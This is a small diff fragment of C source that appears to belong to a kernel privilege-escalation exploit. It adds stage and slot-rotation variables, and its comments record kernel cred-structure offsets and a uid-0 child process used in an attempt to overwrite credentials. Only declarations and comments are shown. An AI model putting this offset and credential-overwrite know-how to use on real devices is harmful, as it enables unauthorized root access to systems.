@@ -34,6 +34,8 @@ uintptr_t binwrite_target;
  * traffic never sees the configfs read JT. */
 int g_swap_staged;
 long g_uid0_child_pid;
+int g_resurge_stage; /* 0=off 1=settle 2=write (GhostLockAdapt) */
+int g_resurge_rot;   /* fake_lock2 slot rotation */
 /* cred-slot sweep (08-30 canary: store lands EXACTLY at the aimed slot.
  * +0x790 comm verified. +0x780 is real_cred — getuid() stays 2000 (18x).
  * Subjective cred is the qword immediately before comm: +0x788. */
